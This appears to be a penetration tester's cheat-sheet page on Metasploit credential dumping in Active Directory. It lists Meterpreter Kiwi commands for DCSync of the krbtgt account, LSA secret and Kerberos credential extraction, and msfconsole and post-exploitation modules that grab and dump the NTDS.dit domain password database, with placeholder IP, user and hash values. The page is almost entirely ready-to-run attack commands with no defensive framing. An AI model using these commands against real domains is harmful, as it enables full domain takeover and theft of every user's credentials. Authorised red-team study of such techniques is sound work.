# Metasploit

## 01 - DC Synchronization

### 1.1 - Kiwi

```
meterpreter > dcsync krbtgt

meterpreter > dcsync_ntlm krbtgt
```

## 02 - LSASS Injection

### 2.1 - Kiwi

```
meterpreter > lsa_dump_secrets
```

## 03 - Kerberos

### 3.1 - Kiwi

```
meterpreter > creds_kerberos
```

## 04 - NTDS

### 4.1 - SMB Network Protocol

```
msf > use auxiliary/admin/smb/psexec_ntdsgrab

msf auxiliary(admin/smb/psexec_ntdsgrab) > options

msf auxiliary(admin/smb/psexec_ntdsgrab) > set rhosts <IP>

msf auxiliary(admin/smb/psexec_ntdsgrab) > set smbdomain <domain_name>

msf auxiliary(admin/smb/psexec_ntdsgrab) > set smbuser <username>

msf auxiliary(admin/smb/psexec_ntdsgrab) > set smbpass < password | nt_hash>

msf auxiliary(admin/smb/psexec_ntdsgrab) > run
```

### 4.2 - Interactive Session

Enumerate the **DSA database file** via registry.

```
meterpreter > reg enumkey [-r <domain_controller_IP>] -k HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters -v "DSA Database file" [-w <64>]
```

Retrieve credentials from NTDS.

```
meterpreter > run post/windows/gather/credentials/domain_hashdump

meterpreter > run post/windows/gather/file_from_raw_ntfs

meterpreter > run post/windows/gather/ntds_location

meterpreter > run post/windows/gather/ntds_grabber cleanup=true download=true
```

---
## References

- [[Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/06 - File Transfer and Data Exfiltration/Windows/Archive Files/Zip|Windows Archive Files]]

- [Pentestlab: Dumping Domain Password Hashes](https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/)